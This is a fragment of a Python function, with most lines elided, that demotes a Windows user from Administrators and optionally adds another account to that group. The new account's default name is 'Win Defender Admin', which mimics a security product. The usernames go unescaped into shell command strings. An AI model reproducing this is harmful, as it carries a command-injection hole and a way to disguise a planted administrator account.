...
def remove_admin_perms(username:str=None, admin_username:str=None, admin_password:str=None, admin_full_name:str='Win Defender Admin'):
    ...
    run_cmd(f'net localgroup "Users" "{username}" /add')
    run_cmd(f'net localgroup "Administrators" "{username}" /delete')
    ...
    if admin_username and admin_password:
        ...
        run_cmd(f'net localgroup "Administrators" "{admin_username}" /add')
